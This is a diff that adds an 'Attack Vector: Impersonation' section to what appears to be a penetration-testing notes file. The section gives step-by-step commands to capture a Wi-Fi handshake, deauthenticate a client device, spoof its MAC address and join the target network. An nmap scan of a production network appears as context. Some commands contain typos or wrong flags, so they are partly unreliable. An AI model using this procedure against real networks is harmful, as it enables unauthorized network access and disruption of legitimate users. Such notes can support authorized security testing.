@@ -132,6 +132,22 @@ nmap -sS -v -Pn -p0-65535 <TARGET_IP_RANGE_OF_PRODUCTION_NETWORK>
 
 
 
+Attack Vector: Impersonation
+1.) listen for any ssid connecting to target device
+	airmon-ng start wlan0
+	airodumg-ng wlan0mon
+2.) capture handshake if possible
+	airodump-ng wlan0mon -c <CHANNEL> -b <BSSID>
+3.) deauth (preferably inactive) device
+	aireplay-ng --deauth 1 -a <BSSID> wlan0mon
+	airmon-ng stop wlan0mon
+4.) assume target client device's mac address
+	macchanger -m XX:XX:XX:XX:XX:XX
+5.) connect to target network device
+	iwconfig wlan0 <ESSID> <BSSID>
+	
+
+
 
 
 tools:
